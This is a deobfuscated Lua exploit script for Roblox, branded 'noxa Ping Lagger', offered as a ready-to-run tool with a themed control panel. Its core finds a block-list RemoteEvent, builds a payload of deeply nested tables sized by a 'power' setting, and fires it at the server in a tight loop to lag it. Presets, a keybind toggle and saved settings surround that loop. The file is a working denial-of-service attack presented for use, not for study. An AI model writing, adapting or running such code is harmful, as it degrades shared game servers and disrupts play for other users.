-- deobfuscated by solar @s0lardev 
-- /aspectt on topp

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

----------------------------------------------------------------
-- Config
----------------------------------------------------------------
local Config = {
    keybind = Enum.KeyCode.V,
    power = 97000,
    preset = "V1",
    active = false,
    autoBrain = true,
    locked = false,
    posSX = 0.5,
    posOX = 0,
    posSY = 0.5,
    posOY = 0,
    phoneScale = 0.9,
    themeName = "Blue",
    bgImage = "rbxassetid://101918705968012",
    bgVisibility = 70,
}

local PRESETS = {
    V1 = 50000,
    V2 = 97000,
    V3 = 150000,
    V4 = 250000,
    V5 = 500000,
}

local THEMES = {
    { name = "Blue",   accent = Color3.fromRGB(80, 160, 255),  a2 = Color3.fromRGB(40, 100, 200),  ad = Color3.fromRGB(20, 40, 80) },
    { name = "Purple", accent = Color3.fromRGB(180, 90, 255),  a2 = Color3.fromRGB(110, 40, 180),  ad = Color3.fromRGB(40, 15, 60) },
    { name = "Red",    accent = Color3.fromRGB(255, 70, 90),   a2 = Color3.fromRGB(180, 30, 50),   ad = Color3.fromRGB(60, 10, 20) },
    { name = "Green",  accent = Color3.fromRGB(60, 220, 140),  a2 = Color3.fromRGB(30, 150, 90),   ad = Color3.fromRGB(10, 50, 30) },
    { name = "Cyan",   accent = Color3.fromRGB(60, 220, 255),  a2 = Color3.fromRGB(30, 140, 180),  ad = Color3.fromRGB(10, 40, 55) },
    { name = "Orange", accent = Color3.fromRGB(255, 150, 50),  a2 = Color3.fromRGB(200, 90, 20),   ad = Color3.fromRGB(60, 30, 10) },
    { name = "Pink",   accent = Color3.fromRGB(255, 100, 180), a2 = Color3.fromRGB(180, 40, 120),  ad = Color3.fromRGB(55, 15, 40) },
    { name = "White",  accent = Color3.fromRGB(230, 230, 240), a2 = Color3.fromRGB(160, 160, 180), ad = Color3.fromRGB(40, 40, 50) },
}

local function currentTheme()
    for _, t in ipairs(THEMES) do
        if t.name == Config.themeName then
            return t
        end
    end
    return THEMES[1]
end

local function loadConfig()
    pcall(function()
        if type(isfile) ~= "function" or not isfile("noxaPingLaggerConfig.json") then
            return
        end
        local data = HttpService:JSONDecode(readfile("noxaPingLaggerConfig.json"))
        if type(data) ~= "table" then
            return
        end
        if type(data.Keybind) == "string" and Enum.KeyCode[data.Keybind] then
            Config.keybind = Enum.KeyCode[data.Keybind]
        end
        if type(data.power) == "number" then
            Config.power = math.clamp(math.floor(data.power), 1, 999999)
        end
        if type(data.preset) == "string" and PRESETS[data.preset] then
            Config.preset = data.preset
        end
        for _, k in ipairs({ "posSX", "posOX", "posSY", "posOY", "phoneScale" }) do
            if type(data[k]) == "number" then
                Config[k] = data[k]
            end
        end
        if type(data.themeName) == "string" then
            Config.themeName = data.themeName
        end
        if type(data.bgImage) == "string" then
            Config.bgImage = data.bgImage
        end
        if type(data.bgVisibility) == "number" then
            Config.bgVisibility = math.clamp(math.floor(data.bgVisibility / 5 + 0.5) * 5, 0, 100)
        end
        if type(data.autoBrain) == "boolean" then
            Config.autoBrain = data.autoBrain
        end
        if type(data.locked) == "boolean" then
            Config.locked = data.locked
        end
    end)
end

local function saveConfig()
    pcall(function()
        if type(writefile) ~= "function" then
            return
        end
        writefile(
            "noxaPingLaggerConfig.json",
            HttpService:JSONEncode({
                Keybind = Config.keybind.Name,
                power = Config.power,
                preset = Config.preset,
                posSX = Config.posSX,
                posOX = Config.posOX,
                posSY = Config.posSY,
                posOY = Config.posOY,
                phoneScale = Config.phoneScale,
                themeName = Config.themeName,
                bgImage = Config.bgImage,
                bgVisibility = Config.bgVisibility,
                autoBrain = Config.autoBrain,
                locked = Config.locked,
            })
        )
    end)
end

loadConfig()

----------------------------------------------------------------
-- Remote resolver
----------------------------------------------------------------
local function findBlockRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then
        pcall(function()
            rrs = game:GetService("RobloxReplicatedStorage")
        end)
    end
    if not rrs then
        return nil
    end
    for _, name in ipairs({ "SetPlayerBlockList", "UpdateBlockList", "BlockList", "PlayerBlockList" }) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then
            return r
        end
    end
    for _, child in ipairs(rrs:GetChildren()) do
        if child:IsA("RemoteEvent") and tostring(child.Name):find("Block") then
            return child
        end
    end
    return nil
end

----------------------------------------------------------------
-- Bomb: depth 186, copies = min(floor(power / 188), 600)
----------------------------------------------------------------
local function buildBomb(power)
    local chain = { {} }
    local cur = chain[1]
    for _ = 1, 186 do
        local nxt = {}
        table.insert(cur, nxt)
        cur = nxt
    end
    local copies = math.max(1, math.min(math.floor((tonumber(power) or 70000) / 188), 600))
    local out = {}
    for _ = 1, copies do
        table.insert(out, chain)
    end
    return out
end

local function formatPower(n)
    n = tonumber(n) or 0
    if n >= 1000000 then
        return string.format("%.1fM", n / 1000000)
    end
    if n >= 1000 then
        return string.format("%.0fK", n / 1000)
    end
    return tostring(n)
end

----------------------------------------------------------------
-- Lag state
----------------------------------------------------------------
local lagThread = nil
local bombCache = nil
local startedAt = 0

local function stopLag()
    Config.active = false
    if lagThread then
        pcall(task.cancel, lagThread)
        lagThread = nil
    end
    bombCache = nil
end

local function startLag()
    stopLag()
    local remote = findBlockRemote()
    if not remote then
        task.wait(0.15)
        remote = findBlockRemote()
    end
    if not remote then
        warn("[Noxa] Ping Lagger: BlockList remote not found")
        return false
    end

    Config.active = true
    startedAt = os.clock()
    bombCache = buildBomb(Config.power)

    lagThread = task.spawn(function()
        local waitTime = 0.12
        while Config.active do
            local r = findBlockRemote()
            if not r then
                task.wait(0.3)
                r = findBlockRemote()
                if not r then
                    Config.active = false
                    break
                end
            end
            local bomb = bombCache or buildBomb(Config.power)
            if pcall(function()
                r:FireServer(bomb)
            end) then
                waitTime = math.max(waitTime * 0.995, 0.05)
            else
                waitTime = math.min(waitTime * 1.4, 0.45)
            end
            task.wait(waitTime)
        end
    end)
    return true
end

local function toggleLag()
    if Config.active then
        stopLag()
    else
        startLag()
    end
    return Config.active
end

----------------------------------------------------------------
-- UI
----------------------------------------------------------------
pcall(function()
    local old = PlayerGui:FindFirstChild("noxaPingLagger")
    if old then
        old:Destroy()
    end
end)

local accent = currentTheme().accent

local gui = Instance.new("ScreenGui")
gui.Name = "noxaPingLagger"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 120
gui.Parent = PlayerGui

local function tween(obj, info, props)
    local t = TweenService:Create(obj, info, props)
    t:Play()
    return t
end

local phone = Instance.new("Frame")
phone.Name = "Phone"
phone.AnchorPoint = Vector2.new(0.5, 0.5)
phone.Position = UDim2.new(Config.posSX, Config.posOX, Config.posSY, Config.posOY)
phone.Size = UDim2.fromOffset(300, 360)
phone.BackgroundColor3 = Color3.fromRGB(12, 14, 22)
phone.BorderSizePixel = 0
phone.ClipsDescendants = true
phone.Parent = gui
Instance.new("UICorner", phone).CornerRadius = UDim.new(0, 18)

local phoneScale = Instance.new("UIScale")
phoneScale.Scale = Config.phoneScale
phoneScale.Parent = phone

local stroke = Instance.new("UIStroke")
stroke.Color = accent
stroke.Thickness = 1.6
stroke.Transparency = 0.2
stroke.Parent = phone

local bg = Instance.new("ImageLabel")
bg.Size = UDim2.fromScale(1, 1)
bg.BackgroundTransparency = 1
bg.Image = Config.bgImage
bg.ImageTransparency = 1 - (Config.bgVisibility / 100)
bg.ScaleType = Enum.ScaleType.Crop
bg.Parent = phone
Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 18)

local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 48)
header.BackgroundColor3 = Color3.fromRGB(18, 20, 32)
header.BackgroundTransparency = 0.15
header.BorderSizePixel = 0
header.Parent = phone
Instance.new("UICorner", header).CornerRadius = UDim.new(0, 18)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 20)
title.Position = UDim2.fromOffset(14, 8)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBlack
title.TextSize = 14
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Text = "noxa Ping Lagger"
title.Parent = header

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1, -20, 0, 14)
sub.Position = UDim2.fromOffset(14, 28)
sub.BackgroundTransparency = 1
sub.Font = Enum.Font.GothamBold
sub.TextSize = 10
sub.TextColor3 = accent
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.Text = "discord.gg/noxaduels · Noxa UI"
sub.Parent = header

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -24, 0, 18)
status.Position = UDim2.fromOffset(14, 56)
status.BackgroundTransparency = 1
status.Font = Enum.Font.GothamBold
status.TextSize = 12
status.TextColor3 = Color3.fromRGB(200, 70, 70)
status.TextXAlignment = Enum.TextXAlignment.Left
status.Text = "LAGGER: OFF"
status.Parent = phone

local powerBig = Instance.new("TextLabel")
powerBig.Size = UDim2.new(1, -24, 0, 36)
powerBig.Position = UDim2.fromOffset(14, 78)
powerBig.BackgroundTransparency = 1
powerBig.Font = Enum.Font.GothamBlack
powerBig.TextSize = 28
powerBig.TextColor3 = accent
powerBig.TextXAlignment = Enum.TextXAlignment.Left
powerBig.Text = formatPower(Config.power)
powerBig.Parent = phone

local function makeBtn(text, y, w)
    local b = Instance.new("TextButton")
    b.Size = UDim2.fromOffset(w or 130, 30)
    b.Position = UDim2.fromOffset(14, y)
    b.BackgroundColor3 = Color3.fromRGB(28, 32, 48)
    b.BorderSizePixel = 0
    b.Font = Enum.Font.GothamBold
    b.TextSize = 12
    b.TextColor3 = Color3.fromRGB(230, 235, 255)
    b.Text = text
    b.AutoButtonColor = false
    b.Parent = phone
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
    local s = Instance.new("UIStroke")
    s.Color = accent
    s.Thickness = 1
    s.Transparency = 0.45
    s.Parent = b
    return b, s
end

local toggleBtn = makeBtn("ACTIVATE", 122, 130)
local keyBtn = makeBtn("[" .. Config.keybind.Name .. "]", 122, 130)
keyBtn.Position = UDim2.fromOffset(156, 122)

local powerBox = Instance.new("TextBox")
powerBox.Size = UDim2.new(1, -28, 0, 30)
powerBox.Position = UDim2.fromOffset(14, 160)
powerBox.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
powerBox.BorderSizePixel = 0
powerBox.Font = Enum.Font.GothamBold
powerBox.TextSize = 13
powerBox.TextColor3 = Color3.fromRGB(255, 255, 255)
powerBox.PlaceholderText = "Power 1 – 999999"
powerBox.Text = tostring(Config.power)
powerBox.ClearTextOnFocus = false
powerBox.Parent = phone
Instance.new("UICorner", powerBox).CornerRadius = UDim.new(0, 8)

-- presets
local presetY = 198
local presetBtns = {}
local presetOrder = { "V1", "V2", "V3", "V4", "V5" }
for i, name in ipairs(presetOrder) do
    local b = Instance.new("TextButton")
    b.Size = UDim2.fromOffset(50, 26)
    b.Position = UDim2.fromOffset(14 + (i - 1) * 56, presetY)
    b.BackgroundColor3 = Config.preset == name and accent or Color3.fromRGB(28, 32, 48)
    b.BorderSizePixel = 0
    b.Font = Enum.Font.GothamBold
    b.TextSize = 11
    b.TextColor3 = Config.preset == name and Color3.fromRGB(12, 12, 16) or Color3.fromRGB(220, 225, 240)
    b.Text = name
    b.AutoButtonColor = false
    b.Parent = phone
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
    presetBtns[name] = b
end

-- theme row
local themeLabel = Instance.new("TextLabel")
themeLabel.Size = UDim2.new(1, -28, 0, 14)
themeLabel.Position = UDim2.fromOffset(14, 232)
themeLabel.BackgroundTransparency = 1
themeLabel.Font = Enum.Font.GothamBlack
themeLabel.TextSize = 9
themeLabel.TextColor3 = Color3.fromRGB(140, 150, 180)
themeLabel.TextXAlignment = Enum.TextXAlignment.Left
themeLabel.Text = "NOXA THEME"
themeLabel.Parent = phone

local themeFrame = Instance.new("Frame")
themeFrame.Size = UDim2.new(1, -28, 0, 40)
themeFrame.Position = UDim2.fromOffset(14, 248)
themeFrame.BackgroundTransparency = 1
themeFrame.Parent = phone

local themeLayout = Instance.new("UIListLayout")
themeLayout.FillDirection = Enum.FillDirection.Horizontal
themeLayout.Padding = UDim.new(0, 4)
themeLayout.Parent = themeFrame

local themeStrokes = {}
for _, th in ipairs(THEMES) do
    local b = Instance.new("TextButton")
    b.Size = UDim2.fromOffset(32, 32)
    b.BackgroundColor3 = th.ad
    b.BorderSizePixel = 0
    b.Text = ""
    b.AutoButtonColor = false
    b.Parent = themeFrame
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
    local g = Instance.new("UIGradient")
    g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, th.ad),
        ColorSequenceKeypoint.new(0.5, th.accent),
        ColorSequenceKeypoint.new(1, th.a2),
    })
    g.Rotation = 25
    g.Parent = b
    local s = Instance.new("UIStroke")
    s.Color = Config.themeName == th.name and th.accent or Color3.fromRGB(55, 55, 65)
    s.Thickness = 1.5
    s.Transparency = Config.themeName == th.name and 0 or 0.35
    s.Parent = b
    themeStrokes[th.name] = s
    b.MouseButton1Click:Connect(function()
        Config.themeName = th.name
        accent = th.accent
        applyTheme()
        saveConfig()
    end)
end

local lockBtn = makeBtn(Config.locked and "LOCKED" or "UNLOCKED", 300, 130)
local brainBtn = makeBtn(Config.autoBrain and "BRAIN: ON" or "BRAIN: OFF", 300, 130)
brainBtn.Position = UDim2.fromOffset(156, 300)

----------------------------------------------------------------
-- Theme / status refresh
----------------------------------------------------------------
local accentTargets = { stroke, powerBig, sub }

function applyTheme()
    local th = currentTheme()
    accent = th.accent
    for _, obj in ipairs(accentTargets) do
        pcall(function()
            if obj:IsA("UIStroke") then
                obj.Color = accent
            elseif obj:IsA("TextLabel") then
                obj.TextColor3 = accent
            end
        end)
    end
    for name, s in pairs(themeStrokes) do
        s.Color = name == Config.themeName and accent or Color3.fromRGB(55, 55, 65)
        s.Transparency = name == Config.themeName and 0 or 0.35
    end
    for name, b in pairs(presetBtns) do
        b.BackgroundColor3 = Config.preset == name and accent or Color3.fromRGB(28, 32, 48)
        b.TextColor3 = Config.preset == name and Color3.fromRGB(12, 12, 16) or Color3.fromRGB(220, 225, 240)
    end
end

local function refreshStatus()
    status.Text = Config.active and "LAGGER: ON" or "LAGGER: OFF"
    status.TextColor3 = Config.active and Color3.fromRGB(90, 255, 150) or Color3.fromRGB(200, 70, 70)
    toggleBtn.Text = Config.active and "STOP" or "ACTIVATE"
    toggleBtn.BackgroundColor3 = Config.active and Color3.fromRGB(120, 30, 40) or Color3.fromRGB(28, 32, 48)
    powerBig.Text = formatPower(Config.power)
    powerBox.Text = tostring(Config.power)
    keyBtn.Text = "[" .. Config.keybind.Name .. "]"
    lockBtn.Text = Config.locked and "LOCKED" or "UNLOCKED"
    brainBtn.Text = Config.autoBrain and "BRAIN: ON" or "BRAIN: OFF"
    applyTheme()
end

----------------------------------------------------------------
-- Handlers
----------------------------------------------------------------
toggleBtn.MouseButton1Click:Connect(function()
    toggleLag()
    refreshStatus()
end)

powerBox.FocusLost:Connect(function()
    local n = tonumber(powerBox.Text) or Config.power
    Config.power = math.clamp(math.floor(n), 1, 999999)
    Config.preset = "CUSTOM"
    if Config.active then
        startLag()
    end
    refreshStatus()
    saveConfig()
end)

for name, b in pairs(presetBtns) do
    b.MouseButton1Click:Connect(function()
        Config.preset = name
        Config.power = PRESETS[name]
        if Config.active then
            startLag()
        end
        refreshStatus()
        saveConfig()
    end)
end

lockBtn.MouseButton1Click:Connect(function()
    Config.locked = not Config.locked
    refreshStatus()
    saveConfig()
end)

brainBtn.MouseButton1Click:Connect(function()
    Config.autoBrain = not Config.autoBrain
    refreshStatus()
    saveConfig()
end)

-- keybind capture
local capturing = false
keyBtn.MouseButton1Click:Connect(function()
    capturing = true
    keyBtn.Text = "[...]"
    keyBtn.TextColor3 = accent
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if capturing then
        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode ~= Enum.KeyCode.Unknown then
            Config.keybind = input.KeyCode
            capturing = false
            keyBtn.Text = "[" .. Config.keybind.Name .. "]"
            keyBtn.TextColor3 = Color3.fromRGB(230, 235, 255)
            saveConfig()
        end
        return
    end
    if gp then
        return
    end
    if input.KeyCode == Config.keybind then
        toggleLag()
        refreshStatus()
    end
end)

-- drag (respect lock)
do
    local dragging, origin, startPos
    local function begin(input)
        if Config.locked then
            return
        end
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
            return
        end
        dragging = true
        origin = input.Position
        startPos = phone.Position
    end
    header.InputBegan:Connect(begin)
    phone.InputBegan:Connect(begin)
    UserInputService.InputChanged:Connect(function(input)
        if not dragging then
            return
        end
        if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then
            return
        end
        local d = input.Position - origin
        phone.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                dragging = false
                Config.posSX = phone.Position.X.Scale
                Config.posOX = phone.Position.X.Offset
                Config.posSY = phone.Position.Y.Scale
                Config.posOY = phone.Position.Y.Offset
                saveConfig()
            end
        end
    end)
end

-- open animation
phone.Size = UDim2.fromOffset(260, 300)
tween(phone, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.fromOffset(300, 360),
})

refreshStatus()